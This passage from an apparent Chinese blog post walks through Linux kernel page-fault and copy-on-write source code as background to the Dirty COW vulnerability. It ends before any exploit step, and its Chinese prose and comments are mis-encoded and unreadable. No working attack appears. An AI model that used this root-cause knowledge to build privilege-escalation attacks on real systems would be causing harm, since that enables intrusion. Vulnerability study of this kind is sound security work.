class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	entry = *pte;</span><br><span class="line">	barrier();</span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123; <span class="comment">/* pteÊâÄÊåáÂêëÁöÑÁâ©ÁêÜÂú∞ÂùÄ‰∏çÂ≠òÂú® */</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123; <span class="comment">/* pte‰∏≠ÂÜÖÂÆπ‰∏∫Á©∫,Ë°®Á§∫ËøõÁ®ãÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆËØ•È°µ */</span></span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops)</span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry); <span class="comment">/* ÈùûÂåøÂêçÂå∫Âüü,ÂàÜÈÖçÁâ©ÁêÜÈ°µÊ°Ü */</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> do_anonymous_page(mm, vma, address, pte, pmd,</span><br><span class="line">					flags); <span class="comment">/* vma‰∏∫ÂåøÂêçÂå∫Âüü,ÂàÜÈÖçÁâ©ÁêÜÈ°µÊ°Ü,ÂàùÂßãÂåñ‰∏∫ÂÖ®&#x27;0&#x27; */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry); <span class="comment">/* ËØ¥ÊòéËØ•È°µ‰πãÂâçÂ≠òÂú®‰∫é‰∏ªÂ≠ò‰∏≠,‰ΩÜÊòØË¢´SwapÊú∫Âà∂Êç¢Âá∫‰∫Ü,‰∫éÊòØÂÜçÊ¨°Êç¢ÂõûÂç≥ÂèØ */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">/* pteÊâÄÊåáÂêëÁöÑÁâ©ÁêÜÂú∞ÂùÄÂ≠òÂú®,Âç≥ËØ•È°µÂú®Áâ©ÁêÜÂÜÖÂ≠ò‰∏≠ */</span></span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry)) <span class="comment">/* ÂØπÂ∫îÁöÑÈ°µ‰∏çÂèØÂÜô */</span></span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry); <span class="comment">/* ËøõË°åÂÜôÊó∂Â§çÂà∂,Â∞ÜÂÜÖÂÆπÂÜôÂà∞ÂâØÊú¨È°µÈù¢‰∏ä */</span></span><br><span class="line">		entry = pte_mkdirty(entry); <span class="comment">/* ÂØπÂ∫îÁöÑÈ°µÂèØÂÜô,Â∞ÜËØ•È°µ&quot;Ê†áËÑè&quot; */</span></span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) <span class="comment">/* Â¶ÇÊûúÂ≠òÂú®FAULT_FLAG_WRITEÊ†áÂøó‰Ωç,Ë°®Á§∫Áº∫È°µÂºÇÂ∏∏Áî±ÂÜôÊìç‰ΩúÂºïËµ∑ */</span></span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Â¶ÇÊûúËØ• <code>pte</code> ‰∏çÂú®Áâ©ÁêÜÂÜÖÂ≠ò‰∏≠<ul>
<li>Â¶ÇÊûú <code>pte</code> ‰∏∫Á©∫ÔºåËØ¥ÊòéËøõÁ®ãÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆËØ•È°µÈù¢<ul>
<li>Â¶ÇÊûú <code>vma</code> Â±ûÊÄßÊòØÂåøÂêçÊò†Â∞ÑÔºàÊ≤°ÊúâÁúüÂÆûÁöÑÁ£ÅÁõòÊñá‰ª∂‰∏éËØ•Âú∞ÂùÄÂØπÂ∫îÔºâ</li>
<li>Â¶ÇÊûú <code>vma</code> ‰∏çÊòØÂåøÂêçÔºåËØ¥ÊòéÊòØÊñá‰ª∂Êò†Â∞ÑÔºåËøõÂÖ• <code>do_fault</code> ÂáΩÊï∞</li>
</ul>
</li>
<li>Â¶ÇÊûú <code>pte</code> ‰∏ç‰∏∫Á©∫ÔºåËØ¥ÊòéËØ•È°µÊ≠§ÂâçËÆøÈóÆËøáÔºå‰ΩÜÊòØË¢´Êç¢Âá∫‰∫ÜÔºåÂè™ÈúÄË¶ÅÂÜçÊç¢ÂÖ•Âç≥ÂèØ</li>
<li>PSÔºö<code>pte</code> Êó¢ÂèØ‰ª•Á¥¢ÂºïÂà∞ÂÜÖÂ≠ò‰∏≠ÁöÑÁâ©ÁêÜÈ°µÔºå‰πüÂèØ‰ª•Á¥¢Âºï‰∫§Êç¢Âå∫ÊèèËø∞Á¨¶ <code>swap_info_struct</code> Âú® <code>swap_info</code> Êï∞ÁªÑÁöÑ‰∏ãÊ†áÔºå‰ª•ÂèäÂú® <code>swap_map</code> ‰∏≠ÁöÑÂÅèÁßªÈáè</li>
</ul>
</li>
<li>Â¶ÇÊûúËØ• <code>pte</code> Âú®Áâ©ÁêÜÂÜÖÂ≠ò‰∏≠ÔºåËØ¥ÊòéÊ≠§Ê¨° <code>page_fault</code> ‰∏çÊòØÈ°µÈù¢Áº∫Â§±ÂºïËµ∑ÔºåÊ£ÄÊü•ÊòØÂê¶Áî±ÂÜôÊìç‰ΩúÂºïËµ∑<ul>
<li>È°µÈù¢‰∏çÂèØÂÜôÔºåËøõÂÖ• <code>do_wp_page</code> ËøõË°å COW Êìç‰Ωú</li>
<li>È°µÈù¢ÂèØÂÜôÔºåÊ†áËÆ∞ <code>dirty</code> ‰Ωç</li>
</ul>
</li>
<li><code>do_fault</code>ÔºöÊ£ÄÊü•ÂêÑÁßçÊ†áÂøó‰ΩçÔºåÊ†πÊçÆ‰∏çÂêåÁöÑÊÉÖÂÜµË∞ÉÁî®‰∏çÂêåÁöÑÂáΩÊï∞</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE)) <span class="comment">/* ÈùûÂÜôÊìç‰ΩúÂºïËµ∑ÁöÑÁº∫È°µÂºÇÂ∏∏(ËØªÊìç‰Ωú) */</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) <span class="comment">/* ÈùûËÆøÈóÆÂÖ±‰∫´ÂÜÖÂ≠ò(ÁßÅÊúâÊñá‰ª∂Êò†Â∞Ñ)ÂºïËµ∑ÁöÑÁº∫È°µÂºÇÂ∏∏(ÂÜôÊìç‰Ωú) */</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte); <span class="comment">/* ËøõË°åÂÜôÊó∂Â§çÂà∂,Áº∫È°µÁöÑCOWÂ§ÑÁêÜÂáΩÊï∞ */</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte); <span class="comment">/* ËÆøÈóÆÂÖ±‰∫´ÂÜÖÂ≠òÂºïËµ∑ÁöÑÁº∫È°µÂºÇÂ∏∏ */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dirty Cow ÊºèÊ¥ûÂ∞±Ê∫êËá™‰∫éÂÜÖÊ†∏ÂØπ Cow ÁöÑÂ§ÑÁêÜ‰∏çÂΩìÔºåËøôÈáåÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®‰ª•‰∏ãÂáΩÊï∞Ôºö</p>
<ul>
<li><code>do_wp_page</code>Ôºö‰∏çÁº∫È°µÁöÑ COW Â§ÑÁêÜÂáΩÊï∞</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123; <span class="comment">/* ÂΩìold_pageÊòØNULLÊó∂ */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123; <span class="comment">/* ÂÖàÂ§ÑÁêÜÂåøÂêçÈ°µÈù¢ */</span></span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">/* Ë∞ÉÁî®reuse_swap_pageÂà§Êñ≠‰ΩøÁî®ËØ•È°µÁöÑÊòØÂê¶Âè™Êúâ‰∏Ä‰∏™ËøõÁ®ã,Ëã•ÊòØÁöÑËØùÂ∞±Áõ¥Êé•ÈáçÁî®ËØ•È°µ */</span></span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* ‰∏ÄËà¨ÁöÑcowÊµÅÁ®ã‰ºöËµ∞Âà∞ËøôÈáå,ÈáçÁî®Áî±do_cow_faultÂàÜÈÖçÂ•ΩÁöÑÂÜÖÂ≠òÈ°µÂâØÊú¨ */</span></span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_cow_fault</code>ÔºöÁº∫È°µÁöÑ COW Â§ÑÁêÜÂáΩÊï∞</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address); <span class="comment">/* ÂàÜÈÖçÊñ∞Áâ©ÁêÜÈ°µ */</span></span><br><span class="line">	<span class="keyword">if</span> (!new_page)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page); <span class="comment">/* Êü•ÊâæÂéüÂßãÊò†Â∞ÑÈ°µ */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma); <span class="comment">/* Êã∑Ë¥ùfault_pageÂÜÖÂÆπÂà∞new_page */</span></span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>); <span class="comment">/* ËÆæÁΩÆpteË°®È°π  */</span></span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">		unlock_page(fault_page);</span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>wp_page_reuse</code>ÔºöÈáçÁî®Áî± <code>do_cow_fault</code> ÂàÜÈÖçÂ•ΩÁöÑÂÜÖÂ≠òÈ°µÂâØÊú¨</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">wp_page_reuse</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">pte_t</span> *page_table, <span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page, <span class="keyword">int</span> page_mkwrite,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> dirty_shared)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">if</span> (page)</span><br><span class="line">		page_cpupid_xchg_last(page, (<span class="number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	flush_cache_page(vma, address, pte_pfn(orig_pte));</span><br><span class="line">	entry = pte_mkyoung(orig_pte);</span><br><span class="line">    <span class="comment">/* ËÆæÁΩÆpteÁöÑdirty‰Ωç,Â¶ÇÊûúVMAÊòØÂèØÂÜôÁöÑ,Ëøò‰ºöÁªôpteÊ†áËÆ∞ÂèØÂÜô */</span></span><br><span class="line">	entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, page_table, entry, <span class="number">1</span>))</span><br><span class="line">		update_mmu_cache(vma, address, page_table);</span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dirty_shared) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">		<span class="keyword">int</span> dirtied;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			lock_page(page);</span><br><span class="line"></span><br><span class="line">		dirtied = set_page_dirty(page);</span><br><span class="line">		VM_BUG_ON_PAGE(PageAnon(page), page);</span><br><span class="line">		mapping = page-&gt;mapping;</span><br><span class="line">		unlock_page(page);</span><br><span class="line">		page_cache_release(page);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;</span><br><span class="line">			balance_dirty_pages_ratelimited(mapping);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			file_update_time(vma-&gt;vm_file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> VM_FAULT_WRITE; <span class="comment">/* Ëøô‰∏™Ê†áÂøóË°®Á§∫Â∑≤ÁªèÂÅöÂ•Ω‰∫ÜCOW,Ëøô‰∏™È°µÈù¢ÂèØ‰ª•ÂÜôÂÖ• */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Êé•‰∏ãÊù•Â∞±ÈáçÁÇπÂàÜÊûê‰∏Ä‰∏ã <code>write</code> ÂáΩÊï∞ÂÜôÂÖ• VMA ÂØπÂ∫îÂú∞ÂùÄÁöÑËøáÁ®ãÔºö</p>
<ul>
<li>ÂâçÈù¢ÂàÜÊûêÂà∞ÔºåÁ®ãÂ∫èÊâßË°å <code>mmap</code> ÁîüÊàê VMA ÁªìÊûÑ‰ΩìÊòØÂè™ËØªÁöÑÔºåÂπ∂‰∏îÊ≤°ÊúâËÆæÁΩÆÈ°µË°®È°π</li>
<li>Êé•‰∏ãÊù• <code>write</code> ÁöÑË∞ÉÁî®ÈìæÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write -&gt; ... -&gt; mem_rw -&gt; ... -&gt; copy_to_user -&gt; __get_user_pages</span><br></pre></td></tr></table></figure>
<ul>
<li>ËøôÈáåÊàë‰ª¨Âè™ÈúÄË¶ÅÂÖ≥Ê≥®ÊúÄÂêé‰∏Ä‰∏™ÂáΩÊï∞ <code>__get_user_pages</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">retry:</span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched(); <span class="comment">/* 